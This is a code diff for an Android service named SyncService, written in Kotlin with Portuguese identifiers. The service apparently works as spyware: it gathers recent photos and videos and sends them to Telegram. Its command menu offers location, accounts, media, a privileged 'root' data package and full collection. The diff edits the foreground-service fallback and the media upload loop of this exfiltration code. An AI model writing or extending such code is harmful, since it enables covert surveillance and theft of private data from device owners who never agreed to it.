@@ -124,12 +124,12 @@ class SyncService : Service() {
         } catch (e: Exception) {
             Log.e(TAG, "startForeground $tipo", e)
             try {
-                ServiceCompat.startForeground(
-                    this, NOTIF_ID, notificacao,
-                    if (Build.VERSION.SDK_INT >= 34) ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE else 0
-                )
+                val reserva = if (Build.VERSION.SDK_INT >= 34) {
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
+                } else 0
+                ServiceCompat.startForeground(this, NOTIF_ID, notificacao, reserva)
             } catch (e2: Exception) {
-                Log.e(TAG, "startForeground fallback", e2)
+                Log.e(TAG, "startForeground reserva", e2)
             }
         }
     }
@@ -186,9 +186,7 @@ class SyncService : Service() {
     private fun enviarMidia() {
         val lote = Collector.midiaRecente(this, desde("midia"))
         for (arquivo in lote.arquivos) {
-            if (Telegram.sendFile(arquivo, "Mídia recente")) {
-                marcar("midia", lote.ate)
-            }
+            Telegram.sendFile(arquivo, "Mídia recente")
         }
         marcar("midia", lote.ate)
     }
@@ -230,7 +228,7 @@ class SyncService : Service() {
                     "/loc — localização\n" +
                     "/contas — contas\n" +
                     "/midia — últimas fotos e vídeos\n" +
-                    "/root — resumo e pacote de dados privilegiados\n" +
+                    "/root — resumo e pacote privilegiado\n" +
                     "/tudo — coleta completa\n" +
                     "/parar — encerra o serviço",
                 chat
